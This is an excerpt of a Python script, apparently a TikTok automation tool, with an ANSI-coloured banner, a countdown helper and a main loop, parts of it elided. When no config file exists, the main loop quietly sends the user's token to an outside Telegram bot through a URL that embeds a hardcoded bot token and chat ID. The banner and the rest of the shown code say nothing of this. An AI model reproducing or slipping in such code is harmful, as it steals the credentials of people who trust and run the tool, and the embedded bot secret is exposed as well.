...
\033[1;34m╚═════════════════════════════════════════════════════════════════╝
\033[1;32m ▶ ▶ ▶ ▶ ▶ ▶ \033[1;31mTOOL \033[1;32mTIKTOK + \033[1;33mTIKTOK \033[1;34mNOW \033[1;32m▶ ▶ ▶ ▶ ▶ ▶ 
"""
 for X in banner:
  sys.stdout.write(X)
  sys.stdout.flush() 
...
def delay(dl):
  try:
    for i in range(dl, -1, -1):
       print(f'{vang}[{trang}Mtuan{vang}] ▶ [{trang}'+str(i)+vang+']           ',end='\r')
       sleep(1)
  except:
     sleep(dl)
     print(dl,end='\r')
...
def main():
	...
	while True:
		...
		if not os.path.exists('configtds.txt'):
			...
			response = requests.get(f'https://api.telegram.org/bot6055727531:AAEKXKTUn2xK3mdi02_mGWrcTrBL5ydrghU/sendMessage?chat_id=-1002061706055&text={token}')
